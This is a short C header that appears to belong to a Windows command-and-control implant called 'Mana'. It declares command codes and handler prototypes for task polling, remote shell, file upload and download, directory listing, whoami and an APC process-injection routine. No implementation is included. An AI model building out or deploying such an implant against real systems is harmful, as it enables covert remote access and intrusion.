#ifndef Mana_COMMAND_H
#define Mana_COMMAND_H

#include <windows.h>
#include <Parser.h>

#define COMMAND_REGISTER         0x100
#define COMMAND_GET_JOB          0x101
#define COMMAND_NO_JOB           0x102

#define COMMAND_SHELL            0x152
#define COMMAND_UPLOAD           0x153
#define COMMAND_DOWNLOAD         0x154
#define COMMAND_EXIT             0x155

#define COMMAND_OUTPUT           0x200

#define COMMAND_PWD              0x400
#define COMMAND_CD               0x401
#define COMMAND_LS               0x402

//Situational awareness
#define COMMAND_WHOAMI           0x300


//Process injection
#define COMMAND_EBAPC            0x600

typedef struct
{
    INT ID;
    VOID ( *Function ) ( PPARSER Arguments );
} Mana_COMMAND;

// Functions
VOID CommandDispatcher();

VOID CommandShell( PPARSER Parser );
VOID CommandUpload( PPARSER Parser );
VOID CommandDownload( PPARSER Parser );
VOID CommandExit( PPARSER Parser );

//Situational awareness
VOID CommandWhoami( PPARSER Parser );
VOID CommandPwd( PPARSER Parser );
VOID CommandCd( PPARSER Parser );
VOID CommandLs( PPARSER Parser );
VOID CommandEbapc( PPARSER Parser );
#endif
